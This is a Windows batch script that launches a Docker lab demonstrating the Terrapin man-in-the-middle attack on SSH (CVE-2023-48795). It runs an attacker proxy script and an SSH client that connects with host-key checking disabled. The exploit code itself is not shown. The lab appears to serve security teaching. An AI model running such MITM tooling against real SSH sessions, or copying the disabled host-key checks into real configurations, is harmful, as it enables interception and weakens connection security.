@echo off
REM Terrapin Attack - One-Click Execution
REM This script runs the complete attack demonstration

echo.
echo ╔══════════════════════════════════════════════════════════╗
echo ║         TERRAPIN ATTACK - ONE-CLICK EXECUTION           ║
echo ║                   CVE-2023-48795                        ║
echo ╚══════════════════════════════════════════════════════════╝
echo.

echo [*] Checking Docker containers...
docker-compose ps | findstr "Up" >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo [!] Containers not running. Starting lab...
    docker-compose up -d
    timeout /t 5 /nobreak >nul
)

echo [+] Containers are running
echo.
echo [*] Starting attack in 2 terminals...
echo     - Terminal 1: MITM Proxy (this window)
echo     - Terminal 2: SSH Client (opens automatically)
echo.
echo [*] Wait for "Waiting for SSH client..." message
echo [*] Then the client will connect automatically
echo.
echo Press any key to start the attack...
pause >nul

REM Start SSH client in new window after 5 seconds
start /min cmd /c "timeout /t 5 /nobreak >nul && docker exec -it terrapin-client ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 testuser@attacker"

REM Run MITM proxy in current window
docker exec -it terrapin-attacker python3 /attack/manual_attack_demo.py

echo.
echo [*] Attack completed!
echo.
pause
